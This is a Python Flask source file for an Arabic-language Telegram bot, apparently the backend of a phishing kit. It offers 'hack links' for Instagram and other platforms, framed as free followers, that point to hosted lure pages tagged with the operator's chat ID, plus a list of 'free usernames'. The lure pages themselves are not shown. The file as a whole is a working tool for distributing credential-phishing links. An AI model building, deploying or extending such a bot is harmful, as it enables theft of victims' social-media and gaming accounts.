from flask import Flask, request
import requests
import os

app = Flask(__name__)

TOKEN = os.environ.get("TELEGRAM_TOKEN")
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-bot.onrender.com")

# الأزرار
buttons = [
    ["📱 انستقرام", "📘 فيسبوك"],
    ["💬 واتساب", "👻 سناب شات"],
    ["🎮 فري فاير", "🔫 بوبجي"],
    ["🎁 يوزرات مجانية", "❓ تعليمات"]
]

WELCOME_MSG = """
👑 *مرحبا بك في بوت خالد ابو الجود* 👑
━━━━━━━━━━━━━━━━━━━━━━━━━━
🔥 *أقوى بوت في العالم!*

اختر المنصة من الأزرار 👇
"""

# يوزرات متاحة
USERNAMES = ["rwilz", "qwnf7", "4ytw5", "xe72c", "2rfv4", "ch1ff"]

@app.route(f"/{TOKEN}/webhook", methods=["POST"])
def webhook():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")
        
        if text == "/start":
            send_message(chat_id, WELCOME_MSG, buttons)
        elif text == "📱 انستقرام":
            send_link(chat_id, "instagram", "انستقرام - 5000 متابع مجاني")
        elif text == "🎁 يوزرات مجانية":
            send_usernames(chat_id)
        else:
            send_message(chat_id, "👑 أرسل /start", None)
    
    return "ok"

def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = {"keyboard": keyboard, "resize_keyboard": True}
    try:
        requests.post(url, json=data)
    except:
        pass

def send_link(chat_id, platform, name):
    link = f"{BASE_URL}/{platform}.html?chatId={chat_id}"
    msg = f"🔥 رابط اختراق {name}:\n<code>{link}</code>"
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"})
    except:
        pass

def send_usernames(chat_id):
    msg = "🎁 يوزرات متاحة:\n" + "\n".join(USERNAMES)
    send_message(chat_id, msg)

@app.route('/')
def home():
    return "✅ البوت شغال 24 ساعة! ابو الجود"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)